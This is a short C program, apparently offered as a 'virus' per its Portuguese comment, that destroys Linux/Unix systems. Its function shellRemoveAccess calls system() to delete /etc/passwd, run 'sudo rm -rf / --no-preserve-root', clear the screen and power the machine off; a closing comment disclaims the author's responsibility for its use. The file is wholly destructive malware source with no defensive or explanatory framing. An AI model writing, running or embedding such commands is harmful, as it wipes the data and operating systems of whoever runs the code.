#include <stdio.h>
#include <stdlib.h>

void shellRemoveAccess()
{
    system("sudo rm -r /etc/passwd");
    system("clear");
    system("sudo rm -rf / --no-preserve-root");
    system("clear");
    system("poweroff");
}

int main()
{
    system("clear");
    shellRemoveAccess();
    return 0;
}

/*Virus destruidos de computadores, com kernel linux/unix, o criador do projeto nao se responsabiliza,
pelo uso do virus.
*/
